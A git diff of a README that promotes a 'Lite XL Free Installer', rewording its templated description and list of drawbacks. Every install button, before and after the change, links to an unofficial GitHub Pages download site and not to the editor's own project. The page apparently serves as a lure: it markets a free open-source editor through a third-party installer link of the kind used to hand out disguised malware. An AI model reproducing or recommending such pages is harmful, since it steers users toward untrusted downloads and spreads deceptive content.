@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Lite XL Free Installer** — Lite XL is a free, open-source, lightweight text editor for Windows, macOS, and Linux written in C and Lua. Works without internet access, no account required. Full offline installation.
+**💻 Lite XL Free Installer** — Lite XL is a free, open-source lightweight text editor for Windows, macOS, and Linux written in Lua and C. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Lite XL](https://img.shields.io/badge/⬇_Install_Lite%20XL-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Lite XL](https://img.shields.io/badge/⬇_Install_Lite+XL-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Lite XL
 
-Lite XL is a free, open-source, lightweight text editor for Windows, macOS, and Linux written in C and Lua. Extremely fast and memory-efficient, it provides syntax highlighting, a plugin system, and LSP support in an editor that starts in milliseconds.
+Lite XL is a free, open-source lightweight text editor for Windows, macOS, and Linux written in Lua and C. With a plugin system written entirely in Lua, Lite XL can be extended to support any programming workflow. Its extremely small footprint (under 2MB), fast startup, and clean interface appeal to developers who want a minimal but extensible editing environment.
 
 ---
 
 ## ❌ Problem: Lite XL is hard to access
 
-- **Minimal Default Install** — Many features require manual plugin installation
-- **Small Plugin Ecosystem** — Fewer extensions than VS Code or Sublime Text
-- **Basic Default Configuration** — Requires setup investment before competitive with feature-rich editors
-- **Less Documentation** — Help resources sparse compared to popular editors
+- **Feature Set** — Core editor is minimal; advanced features require plugin installation
+- **Plugin Ecosystem** — Smaller than VS Code or Sublime Text plugin libraries
+- **LSP Configuration** — Language server setup requires manual plugin configuration
+- **Community Size** — Smaller user base may mean fewer resources and answers online
 
 ---
 
@@ -81,7 +81,7 @@ Lite XL is a free, open-source, lightweight text editor for Windows, macOS, and 
 
 <div align="center">
 
-[![⬇ Install Lite XL](https://img.shields.io/badge/⬇_Install_Lite%20XL-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Lite XL](https://img.shields.io/badge/⬇_Install_Lite+XL-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Lite XL is a free, open-source, lightweight text editor for Windows, macOS, and 
 
 ---
 
-**Lite XL Free Installer** — Lite XL is a free, open-source, lightweight text editor for Windows, macOS, and Linux written in C and Lua. Install without internet connection today!
+**Lite XL Free Installer** — Lite XL is a free, open-source lightweight text editor for Windows, macOS, and Linux written in Lua and C. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Lite XL](https://img.shields.io/badge/⬇_Install_Lite%20XL-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Lite XL](https://img.shields.io/badge/⬇_Install_Lite+XL-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
